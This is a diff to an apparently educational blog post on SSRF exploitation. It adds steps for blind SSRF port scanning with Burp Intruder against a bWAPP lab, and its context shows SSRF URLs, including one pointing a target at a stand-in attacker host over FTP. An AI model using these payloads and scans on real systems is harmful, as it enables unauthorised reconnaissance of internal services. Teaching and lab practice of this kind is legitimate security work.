@@ -1,5 +1,5 @@
 # Welcome to the Blog!
-Hi! I'm Shubham Dubey and this is my first blog in which i will try to explain post exploitation techniques of old famous Web-Attacks.
+Hi! I'm Shubham Dubey and this is my first blog in which i will try to explain post exploitation techniques of old famous Web-Attacks. Let's start with SSRF and then will continue the series.
 
 # SSRF
 
@@ -81,8 +81,24 @@ http://192.168.28.129/bWAPP/rlfi.php?language=http://192.168.28.1:8888/ssrf_port
 Sample output:
 
 ![](https://hydrasky.com/wp-content/uploads/2016/12/ssrf6.png)
- Or we can use Burpsuite to breuteforce the vulnerability. 
-  ![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/SSRF8.png)
+# Blind SSRF exploitation
+
+1.Intercept the Request.
+
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/s.png)
+
+2.Send the Request to Intruder and select the port location
+
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/s2.png)
+
+3.Select the number list and give the port number to be scanned.
+
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/s3.png)
+
+4.We can sort the attack by length or we can check the length of response received and completed for BlindCheck.
+  
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/s4.png)
+   
 For file transfer protocols:  
 
 `https://target.com/page?url=ftp://attacker.net:11211/  
